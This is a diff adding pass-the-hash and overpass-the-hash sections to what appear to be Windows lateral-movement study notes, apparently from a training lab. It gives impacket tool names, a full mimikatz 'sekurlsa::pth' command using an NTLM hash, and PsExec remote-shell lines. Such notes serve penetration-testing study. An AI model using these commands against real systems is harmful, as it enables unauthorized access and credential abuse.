@@ -48,3 +48,29 @@ Enter-PSSession 1
 ```
 .\PsExec64.exe -i \\hostname -u domain\username -p password cmd
 ```
+
+# Pass the hash
+
+```
+impacket-wmiexec
+
+impacket-psexec
+
+impacket-smbexec
+```
+
+## Overpass the hash
+
+Use the hash to obtain kerberos ticket
+
+In mimikatz.exe
+
+```
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
+
+In powershell / cmd
+
+```
+.\PsExec.exe \\host cmd
+```
